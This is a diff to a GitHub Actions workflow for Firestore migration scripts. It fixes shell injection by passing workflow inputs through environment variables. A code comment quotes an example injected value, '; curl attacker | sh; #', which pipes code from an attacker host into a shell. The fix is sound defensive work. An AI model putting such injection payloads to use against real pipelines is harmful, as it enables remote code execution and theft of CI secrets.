@@ -48,10 +48,17 @@ jobs:
       - name: Install deps
         run: pip install google-cloud-firestore google-cloud-bigquery google-auth firebase-admin requests
 
+      # v933 (2026-09-14, SecAudit Sprint 2 MED-10 VULN-510): pasar inputs
+      # via env: en lugar de interpolar ${{ inputs.X }} directamente en run:.
+      # Antes: valores como confirm_apply="; curl attacker | sh; #" ejecutaban
+      # arbitrary shell dentro del runner. Ahora los inputs entran via env y
+      # se comparan como "$CONFIRM" - shell no expande el valor como comando.
       - name: Validate confirmacion apply
         if: ${{ inputs.dry_run == false }}
+        env:
+          CONFIRM: ${{ inputs.confirm_apply }}
         run: |
-          if [ "${{ inputs.confirm_apply }}" != "APLICAR-PACHI-MIGRATION" ]; then
+          if [ "$CONFIRM" != "APLICAR-PACHI-MIGRATION" ]; then
             echo "::error::confirm_apply debe ser exactamente 'APLICAR-PACHI-MIGRATION' cuando dry_run=false"
             exit 1
           fi
@@ -59,12 +66,13 @@ jobs:
       - name: Script 1 — disable_pachi_and_find
         env:
           FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          DRY_RUN: ${{ inputs.dry_run }}
         run: |
           echo "=================================================="
           echo "SCRIPT 1: disable_pachi_and_find.py"
-          echo "Dry-run: ${{ inputs.dry_run }}"
+          echo "Dry-run: $DRY_RUN"
           echo "=================================================="
-          if [ "${{ inputs.dry_run }}" == "true" ]; then
+          if [ "$DRY_RUN" == "true" ]; then
             python scripts/disable_pachi_and_find.py
           else
             python scripts/disable_pachi_and_find.py --apply
@@ -73,12 +81,13 @@ jobs:
       - name: Script 2 — migrate_pachi_to_santi_coverage
         env:
           FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          DRY_RUN: ${{ inputs.dry_run }}
         run: |
           echo "=================================================="
           echo "SCRIPT 2: migrate_pachi_to_santi_coverage.py"
-          echo "Dry-run: ${{ inputs.dry_run }}"
+          echo "Dry-run: $DRY_RUN"
           echo "=================================================="
-          if [ "${{ inputs.dry_run }}" == "true" ]; then
+          if [ "$DRY_RUN" == "true" ]; then
             python scripts/migrate_pachi_to_santi_coverage.py
           else
             python scripts/migrate_pachi_to_santi_coverage.py --apply
